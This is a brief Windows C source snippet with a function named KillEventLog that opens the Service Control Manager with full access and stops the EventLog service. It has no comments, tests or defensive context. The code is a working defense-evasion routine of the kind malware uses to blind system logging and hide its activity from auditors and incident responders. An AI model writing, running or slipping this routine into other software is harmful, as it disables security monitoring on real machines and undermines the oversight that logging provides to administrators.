#include <windows.h>

VOID KillEventLog(VOID) {
    SC_HANDLE scManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scManager) {
        SC_HANDLE scService = OpenServiceA(scManager, "EventLog", SERVICE_STOP);
        if (scService) {
            SERVICE_STATUS status;
            ControlService(scService, SERVICE_CONTROL_STOP, &status);
            CloseServiceHandle(scService);
        }
        CloseServiceHandle(scManager);
    }
}
